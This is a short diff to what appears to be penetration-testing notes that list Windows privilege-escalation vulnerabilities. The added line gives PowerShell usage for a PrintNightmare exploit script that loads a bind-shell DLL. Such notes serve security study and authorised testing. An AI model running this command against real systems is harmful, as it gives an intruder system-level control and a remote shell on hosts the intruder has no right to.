@@ -251,7 +251,7 @@ MS08-067 affected Windows Server 2000, 2003, and 2008 and Windows XP and Vista
 MS17-010
 ALPC Task Scheduler 0-Day
 CVE-2021-36934 HiveNightmare https://github.com/GossiTheDog/HiveNightmare/tree/master/Release
-CVE-2021-1675/CVE-2021-34527 PrintNightmare
+CVE-2021-1675/CVE-2021-34527 PrintNightmare Import-Module .\cve-2021-1675.ps1 Invoke-Nightmare -DLL "C:\absolute\path\to\your\bindshell.dll"
 CVE-2020-0668
 
 watson.exe
